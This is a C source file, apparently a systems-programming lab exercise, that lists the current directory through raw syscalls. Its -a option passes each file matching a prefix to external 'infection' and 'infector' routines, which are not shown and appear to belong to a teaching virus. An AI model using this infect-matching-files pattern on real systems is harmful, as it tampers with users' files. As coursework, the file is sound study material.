 #include "util.h"

#define STDOUT 1
#define STDIN 0
#define STDERR 2
#define SYS_READ 3
#define SYS_WRITE 4
#define OPEN 5
#define CLOSE 6
#define LSEEK 19
#define O_CREAT 64
#define O_RDONLY 0
#define O_WRONLY 1
#define O_APPEND 1024
#define O_RWX 0777
#define SYS_GETDENTS 141

extern int system_call();
extern void infection(int);
extern void infector(char *);

struct dirent {
    long inodenumber;
    int offset_to_next_dirent;
    unsigned short len;
    char name[];
};

/*char * substring(char* input, int a, int b){
    char *ans = malloc(sizeof(char)*(b-a));
    int i;
    for (i=a; i<b; i++)
        ans[i-a] = input[i];
    system_call(SYS_WRITE,STDOUT,"in sub\n",7);
    return ans;
}*/

void task2(int argc, char* argv[]){
    int ans,index,fd, i, debug = 0, print = 0, attach = 0;
    char *prefp, *prefa;
    char buf[8192];
    struct dirent* direntptr; 
    for(i = 1;i < argc; i++){
        if (argv[i][0]=='-' && argv[i][1]=='D'){
            debug = 1;
        }
        else if(argv[i][0]=='-' && argv[i][1] == 'p'){
            print = 1;
            prefp = argv[i] + 2;
        }
        else if(argv[i][0]=='-' && argv[i][1] == 'a'){
            attach = 1;
            prefa = argv[i] + 2;
        }
    }
    /* flags are now updated */
    fd = system_call(OPEN,".",O_RDONLY,0); 

    while(1==1){
        ans = system_call(SYS_GETDENTS,fd,buf,8192);
        if (ans<0){
            /*error reading from buf*/
        }
        if (ans==0){
            break;
        }
        system_call(SYS_WRITE,STDOUT,"filenames:",10);
        system_call(SYS_WRITE,STDOUT,"\n",1);
        for (index=0; index<ans;){
            direntptr = (struct dirent *) (buf+index);
            if (direntptr->len==0){
                break;
            }
            if(print || attach){
                if (print) {           
                    if (strncmp(direntptr->name,prefp,strlen(prefp))==0) {
                        system_call(SYS_WRITE,STDOUT,direntptr->name,strlen(direntptr->name));
                        system_call(SYS_WRITE,STDOUT,"\n",1);
                    }
                }
                if (attach){
                    if (!strncmp(direntptr->name,prefa,strlen(prefa))){
                        infection(0);
                        infector(direntptr->name);
                    }
                }
            }else {
                system_call(SYS_WRITE,STDOUT,direntptr->name,strlen(direntptr->name));
                system_call(SYS_WRITE,STDOUT,"\n",1);
            }
            index = index + direntptr->len;
        }
    }
    system_call(CLOSE,fd);
}



int main(int argc,char* argv[]){
    task2(argc,argv);
    /*infector("blai");*/
    return 0;
}